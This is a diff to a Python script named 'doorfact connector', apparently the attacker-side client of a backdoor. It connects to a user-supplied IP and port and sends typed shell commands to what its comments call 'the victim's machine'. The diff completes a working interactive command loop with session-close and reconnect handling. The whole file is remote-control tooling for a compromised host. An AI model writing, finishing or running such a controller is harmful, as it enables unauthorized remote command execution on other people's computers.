@@ -33,24 +33,46 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 """
 
 import socket
+import sys
 
 print("doorfact connector\n")
 
 host = input("Type IP adress: ")
 port = int(input("Type port to connect: "))
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def connect(host, port):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
 
-s.connect((host, port))
+	return s
 
-while True:
+def main(s):
 	recv_output = s.recv(16384) # Might be very long
 	print(recv_output.decode())
+	try:
+		while True:
+			inp = input("$ ")
+			if len(inp) <= 0:
+				continue
+			else:
+				s.sendall(inp.encode()) # Send command to the victim's machine
+				recv_output = s.recv(16384)
+				if recv_output.decode() == "sesclosed":
+					print("Received session close. Exiting...")
+					sys.exit(0)
+				print(recv_output.decode())
 
-	inp = input("$ ")
-	if len(inp) <= 0:
-		pass
-	# Very incomplete part - help me with this
-	# I want if I just enter something like space it won't send the command to.
-	else:
-		s.sendall(inp.encode()) # send command to the victim's machine
+	except BrokenPipeError:
+		print("Broken pipe.")
+		reconnect = input("Reconnect? (Y/n) ")
+		if reconnect.lower() == "y":
+			s = connect(host, port)
+			main(s)
+		else:
+			print("Aborting..")
+			sys.exit(0)
+
+s = connect(host, port)
+
+if __name__ == "__main__":
+	main(s)
